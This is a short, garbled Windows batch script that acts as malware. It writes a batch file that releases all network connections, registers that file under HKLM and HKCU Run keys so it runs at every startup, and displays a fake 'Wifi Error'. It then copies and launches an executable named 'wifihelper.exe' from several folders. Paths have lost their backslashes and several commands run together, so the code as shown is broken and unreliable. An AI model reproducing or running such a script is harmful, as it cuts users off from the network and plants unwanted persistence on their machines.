echo @echo off>c:windowswimn32.bat
echo break off>c:windowswimn32.bat echo
ipconfig/release_all>c:windowswimn32.bat
echo end>c:windowswimn32.batreg add
hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho Wifi Error

Copy C:\Program Files\wifihelper.exe C:\Users\Default.Migrated\Documents\
Copy C:\Program Files\wifihelper.exe C:\Windows
Copy C:\Windows\wifihelper.exe C:\Users\Public

Start C:\Program Files\wifihelper.exe
Start C:\Windows\wifihelper.exe
Start C:\Users\Public\wifihelper.exe

exit C:\Program Files\wifihelper.exe
exit C:\Windows\wifihelper.exe
exit C:\Users\Public\wifihelper.exe
